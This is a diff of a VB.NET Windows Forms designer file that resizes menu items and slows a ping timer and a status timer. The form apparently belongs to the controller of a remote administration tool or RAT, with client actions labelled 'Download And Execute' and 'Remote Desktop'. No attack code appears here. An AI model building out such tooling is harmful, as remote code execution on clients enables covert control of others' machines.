@@ -73,30 +73,30 @@ Partial Class Form1
         Me.ClientMenu.ImageScalingSize = New System.Drawing.Size(24, 24)
         Me.ClientMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseClientToolStripMenuItem, Me.DownloadAndExecuteToolStripMenuItem, Me.RemoteDesktopToolStripMenuItem})
         Me.ClientMenu.Name = "ClientMenu"
-        Me.ClientMenu.Size = New System.Drawing.Size(282, 94)
+        Me.ClientMenu.Size = New System.Drawing.Size(269, 94)
         '
         'CloseClientToolStripMenuItem
         '
         Me.CloseClientToolStripMenuItem.Name = "CloseClientToolStripMenuItem"
-        Me.CloseClientToolStripMenuItem.Size = New System.Drawing.Size(281, 30)
+        Me.CloseClientToolStripMenuItem.Size = New System.Drawing.Size(268, 30)
         Me.CloseClientToolStripMenuItem.Text = "Close Client"
         '
         'DownloadAndExecuteToolStripMenuItem
         '
         Me.DownloadAndExecuteToolStripMenuItem.Name = "DownloadAndExecuteToolStripMenuItem"
-        Me.DownloadAndExecuteToolStripMenuItem.Size = New System.Drawing.Size(281, 30)
+        Me.DownloadAndExecuteToolStripMenuItem.Size = New System.Drawing.Size(268, 30)
         Me.DownloadAndExecuteToolStripMenuItem.Text = "Download And Execute"
         '
         'RemoteDesktopToolStripMenuItem
         '
         Me.RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem"
-        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(281, 30)
+        Me.RemoteDesktopToolStripMenuItem.Size = New System.Drawing.Size(268, 30)
         Me.RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
         '
         'Timer_Ping
         '
         Me.Timer_Ping.Enabled = True
-        Me.Timer_Ping.Interval = 5000
+        Me.Timer_Ping.Interval = 30000
         '
         'StatusStrip1
         '
@@ -117,7 +117,7 @@ Partial Class Form1
         'Timer_Status
         '
         Me.Timer_Status.Enabled = True
-        Me.Timer_Status.Interval = 500
+        Me.Timer_Status.Interval = 1000
         '
         'Form1
         '
